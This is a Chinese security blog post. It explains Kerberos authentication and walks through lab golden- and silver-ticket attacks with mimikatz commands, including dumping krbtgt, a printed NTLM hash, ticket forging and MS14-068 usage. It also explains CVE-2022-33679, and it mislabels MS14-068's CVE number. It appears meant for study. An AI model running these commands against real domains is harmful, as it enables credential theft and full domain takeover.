# 前言

最近twitter上关于CVE，应该是CVE-2022-33679比较火了，但是资料也是比较少，下面来唠唠吧。

## kerberos认证原理

先了解几个概念

认证服务(Authentication server）:简称AS,认证客户端身份提供认证服务。

域控服务器(Domain Control）:即DC。

服务票据(Server Ticket):简称ST，在Kerberos认证中，客户端请求的服务通过ST票据认证。

票据授予服务(Ticket Granting server）:简称TGS，颁发服务票据(server ticket)。

活动目录(Active Directory)：简称AD,包含了域中所有的对象(用户，计算机，组等)

KDC密钥颁发中心（KDC）：域控担任

特权属性证书(Privilege Attribute Certificate):简称PAC，所包含的是各种授权信息, 例如用户所属的用户组,
用户所具有的权限等。

下图为Kerberos的认证过程：

![image-20221209141408456](https://image.3001.net/images/20221215/1671090068_639acf9445ced5dc2b397.png!small)

一个完整的认证流程基本上分为8个步骤

1.客户端用户向KDC发送请求，包含用户名，主机名和时间戳。AS接收请求

2.AS对客户端用户身份认证后给客户端返回票据授予票据

3.客户端使用TGT到票据分发服务(TGS)请求访问服务器A的服务票据(ST)

4.TGS给客户端分发ST

5.客户端使用ST请求服务器A

6.服务器A解密ST票据得到特权属性证书PAC,服务器A请求域控AD需确认用户权限

7.域控将PAC解密获取用户SID和用户权限的结果返回给服务器A

8.用户身份符合则进行第最后的返回信息，整个Kerberos认证结束。

## 黄金票据

原理：

Kerberos黄金票据是有效的TGT Kerberos票据，是由域Kerberos帐户加密和签名的
。TGT仅用于向域控制器上的KDC服务证明用户已被其他域控制器认证。TGT被KRBTGT密码散列加密并且可以被域中的任何KDC服务解密的。

相当于跳过上面图片中过的步骤一和步骤二，直接伪造TGT

![image-20221209163535159](https://image.3001.net/images/20221215/1671090070_639acf9635bc89a195f51.png!small)

### 实验

这里利用星海安全实验室的靶场环境

环境：192.168.10.10 域控DC 域：Starseaseclab.com 操作系统：win-server2012R2

域内主机：192.168.10.14 操作系统：win7

使用条件：

域管SID

域名

域控KRBTGT账号的HASHntlm(hash)

> whoami /all

![image-20221209151041923](https://image.3001.net/images/20221215/1671090071_639acf9773a8616628288.png!small)

> lsadump::dcsync /domain:starseaseclab.com /user:krbtgt

![image-20221209154241481](https://image.3001.net/images/20221215/1671090072_639acf9865f7bc5fa7d6a.png!small)

sid:S-1-5-21-1719736279-3906200060-616816393

htlm(hash):5e31f755b33b621bede0946b044908e4

domian:starseaseclab.com

域内主机win-7

![image-20221209155354113](https://image.3001.net/images/20221215/1671090073_639acf996884d6d30924d.png!small)

    
    
    privilege::debug  
    ​  
    kerberos::purge  //清空票据防止缓存影响  
    ​  
    Kerberos::golden /user:administrator /domain:starseaseclab.com /sid:S-1-5-21-1719736279-3906200060-616816393 /krbtgt:5e31f755b33b621bede0946b044908e4  /ptt    //伪造金票注入内存

![image-20221209155550755](https://image.3001.net/images/20221215/1671090074_639acf9a7e97fe51f4d67.png!small)

## 白银票据

原理

黄金票据是伪造TGT,在kerberos认证中忽略前两步，白银票据就是直接伪造ST

![image-20221209163414271](https://image.3001.net/images/20221215/1671090076_639acf9c6594fa4227a34.png!small)

> whoami /all

![image-20221209173913523](https://image.3001.net/images/20221215/1671090077_639acf9dc27eea8756afc.png!small)

sid: S-1-5-21-1719736279-3906200060-616816393

> sekurlsa::logonpasswords

![image-20221209174621489](https://image.3001.net/images/20221215/1671090078_639acf9ee2027dedb643a.png!small)

伪造票据

> Kerberos::golden /domain:starseaseclab.com
> /sid:S-1-5-21-1719736279-3906200060-616816393 /target:win-> dc.starseaseclab.com /service:cifs /rc4:161cff084477fe596a5db81874498a24
> /user:user1 /ptt //伪造银票注入内存

![image-20221209175427057](https://image.3001.net/images/20221215/1671090079_639acf9fe3492921eac81.png!small)

利用MS14-068(CVE-2016-6324)

域内用户提升至域控

条件 ：

域内用户名以及hash

sid值

域名

域控ip

  

    
    
    ms-14-068.exe -u   域用户@域名  -p 域用户密码 -s 域用户sid -d 域控ip  
    kerberos::ptc "票据"   //将票据注入内存

### 黄金票据和白银票据的区别

    
    
    访问权限不同：  
    ​  
    Golden Ticket：伪造TGT，可以获取任何Kerberos服务权限  
    Silver Ticket：伪造TGS，只能访问指定的服务  
    ​  
    加密方式不同：  
    ​  
    Golden Ticket由Kerberos的Hash加密  
    Silver Ticket由服务账号（通常为计算机账户）Hash加密  
    ​  
    认证流程不同：  
    Golden Ticket的利用过程需要访问域控，  
    Silver Ticket不需要

## CVE-2022-33679

攻击的过程分为下面几个步骤

  1. 攻击者发送一个没有预授权的 AS-REQ 请求 RC4-MD4 密钥加密。如果用户不需要预授权，KDC 将发回一个 AS-REP，其中包含使用 RC4-MD4 加密的会话密钥等。

  2. 根据加密数据的长度，计算出加密密钥开始前的0x15字节，只要总长度就可以猜到。可能需要发送适当长的主机地址来填充 ASN1 编码数据，以便将密钥对齐到合适的位置。

  3. 根据计算出的ASN1数据和加密后的KDC-REP生成密钥流的前0x2D字节（密文中前0x18字节全为0）。

  4. 使用密钥流加密 PA-ENC-TIMESTAMP 预认证缓冲区，如果仅使用 KerberosTime，则大小将恰好为 0x15 字节，即带有初始填充的 0x2D。

  5. 在新的 AS-REQ 中发送加密的时间戳以验证密钥流是否正确。

如果将客户端和 KDC 降级为使用 RC4-MD4，攻击者可以让 KDC 使用 RC4-MD4 会话密钥作为初始 TGT，它只有 40
位的熵，并且在关联的票证过期之前实现暴力破解，可为该用户发出任意服务票证的 TGS 请求。

攻击图解

在请求TGT的第一阶段爆破第一个字节的图解

![image-20221214104553601](https://image.3001.net/images/20221215/1671090081_639acfa12fbf75ef005b6.png!small)

获取最后一个字节的过程图解

![image-20221214122942619](https://image.3001.net/images/20221215/1671090082_639acfa2b314e87d0a8de.png!small)

CVE提交者的POC显示已删除，github上披露的EXP已经没了。

![image-20221214160214143](https://image.3001.net/images/20221215/1671090084_639acfa460df91ed23243.png!small)

项目下载地址：

    
    
    https://github.com/GhostPack/Rubeus

需要重新编译一下， **Rubeus** 的V2.1.2实际上也没找到历史发布版本，目前最新版本未V2.2.1

![image-20221214161041126](https://image.3001.net/images/20221215/1671090085_639acfa5d15cec380a03d.png!small)

该版本无法使用cve-2022-33679伪造TGT。该漏洞就利用方式来说跟黄金票据有点儿类似，通过EXP绕过Kerberos认证协议中的第一和第二步骤，直接向TGS请求ST。

![image-20221214161639111](https://image.3001.net/images/20221215/1671090087_639acfa70292ac4823e40.png!small)

# 总结

资料还是有限，没有复现成功，但是就原理来说，结合Kerberos认证原理还是比较清晰。CVE-2022-33679的使用也是有使用条件，需要设置“不需要
Kerberos 预身份验证”用户帐户控制标志，并配置了 RC4 密钥。所以在利用手段上来讲应该是比较苛刻。（如有错误还请各位指出）

  

